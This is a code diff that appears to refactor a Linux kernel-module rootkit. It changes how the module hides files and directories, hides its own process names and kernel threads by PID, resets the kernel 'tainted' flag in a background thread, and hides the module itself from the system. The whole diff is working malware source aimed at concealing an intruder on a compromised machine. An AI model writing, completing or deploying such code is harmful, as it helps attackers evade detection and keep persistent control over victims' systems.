@@ -64,7 +64,6 @@ struct task_struct *tsk_tainted = NULL;
 
 static struct proc_dir_entry *rrProcFileEntry;
 struct __lkmmod_t{ struct module *this_mod; };
-static unsigned int op_lock;
 static DEFINE_MUTEX(prc_mtx);
 static DEFINE_SPINLOCK(elfbits_spin);
 
@@ -512,8 +511,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
             case Opt_hide_file:
                 {
                     char *s = args[0].from;
-                    const char *tmp[] = {NULL, NULL};
-                    struct kstat stat;
+                    struct kstat stat = {0};
                     struct path path;
 
                     if (fs_kern_path(s, &path) && fs_file_stat(&path, &stat)) {
@@ -522,13 +520,12 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                         bool is_dir = ((stat.mode & S_IFMT) == S_IFDIR);
 
                         path_put(&path);
-                        tmp[0] = f;
-                        fs_add_name_rw_dir(tmp, stat.ino, is_dir);
+                        fs_add_name_rw_dir(f, stat.ino, is_dir);
                         kv_mem_free(&f);
                     } else {
                         if (*s != '.' && *s != '/') {
-                            tmp[0] = s;
-                            fs_add_name_rw(tmp, stat.ino);
+                            /** add with unknown inode number */
+                            fs_add_name_rw(s, stat.ino);
                         }
                     }
                 }
@@ -540,9 +537,8 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                     struct path path;
 
                     if (fs_kern_path(s, &path) && fs_file_stat(&path, &stat)) {
-                        const char *name[] = {s ,NULL};
                         bool is_dir = ((stat.mode & S_IFMT) == S_IFDIR);
-                        fs_add_name_rw_dir(name, 0, is_dir);
+                        fs_add_name_rw_dir(s, 0, is_dir);
                     }
                 }
                 break;
@@ -550,10 +546,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                 fs_list_names();
                 break;
             case Opt_unhide_file:
-                {
-                    const char *n[] = {args[0].from, NULL};
-                    fs_del_name(n);
-                }
+                 fs_del_name(args[0].from);
                 break;
             case Opt_journalclt:
                 {
@@ -754,7 +747,7 @@ static int __init kv_init(void) {
 
     int rv = 0;
     char *procname_err = "";
-    const char *hideprocname[] = {PROCNAME, NULL};
+    const char **name;
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
     struct kernel_syscalls *kaddr = NULL;
 #endif
@@ -798,7 +791,7 @@ static int __init kv_init(void) {
     if (!tsk_prc)
         goto unroll_init;
 
-    fs_add_name_ro(hideprocname, 0);
+    fs_add_name_ro(PROCNAME, 0);
 
     tsk_tainted = kthread_run(_reset_tainted, NULL, THREAD_TAINTED_NAME);
     if (!tsk_tainted)
@@ -824,17 +817,19 @@ cont:
     kv_hide_task_by_pid(tsk_prc->pid, 0, CHILDREN);
     kv_hide_task_by_pid(tsk_tainted->pid, 0, CHILDREN);
 
-    /** hide magic filenames & directories */
-    fs_add_name_ro(hide_names, 0);
-
     /** hide magic filenames, directories and processes */
-    fs_add_name_ro(kv_get_hide_ps_names(), 0);
+    for (name = hide_names; *name != NULL; ++name) {
+        fs_add_name_ro(*name, 0);
+    }
+
+    for (name = kv_get_hide_ps_names(); *name != NULL; ++name) {
+        fs_add_name_ro(*name, 0);
+    }
 
     kv_scan_and_hide();
 
 #ifndef DEBUG_RING_BUFFER
     kv_hide_mod();
-    op_lock = 1;
 #endif
 
     prinfo("loaded.\n");
